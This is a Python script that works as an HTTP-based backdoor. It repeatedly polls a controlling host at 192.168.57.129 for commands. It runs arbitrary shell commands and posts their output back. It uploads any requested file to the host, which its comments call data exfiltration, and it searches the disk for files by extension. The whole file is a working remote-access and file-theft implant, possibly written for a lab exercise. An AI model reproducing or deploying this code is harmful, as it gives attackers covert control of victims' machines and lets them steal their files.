import requests 
import subprocess 
import os # used to find the path of the files with given extension
import time

while True: 

    req = requests.get('http://192.168.57.129')
    command = req.text
        
    if 'close' in command:
        break

    # Data Exfilteration
    elif 'grab' in command:
        grab,path = command.split(' ')

        #Check if file exists
        try:
            if os.path.exists(path):
                url = 'http://192.168.57.129/doc'  # /doc in the URL indicates a document has been attached
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url='http://192.168.57.129', data='File not found on the target' )
        except Exception,e:
            post_response = requests.post(url='http://192.168.57.129', data=str(e) )

    # Search for the file extension        
    elif 'search' in command:
        null,path = command.split(' ')
        path,ext = path.split('*')

        # list of all the files matching to particular extension
        lists = ''

        # Navigate to all folders in the directory and search for the file
        # dirpath   : path of the directory
        # dirname   : list of all the sub directories
        # filename  : list of all the files in the direpath
        for dirpath, dirname, files in os.walk(path):
            for file_name in files:
                if file_name.endswith(ext):
                    lists = lists + "\n" + os.path.join(dirpath, file_name)

        requests.post('http://192.168.57.129', data=lists)
            
  
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stdout.read() )
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stderr.read() )

    time.sleep(3)
    
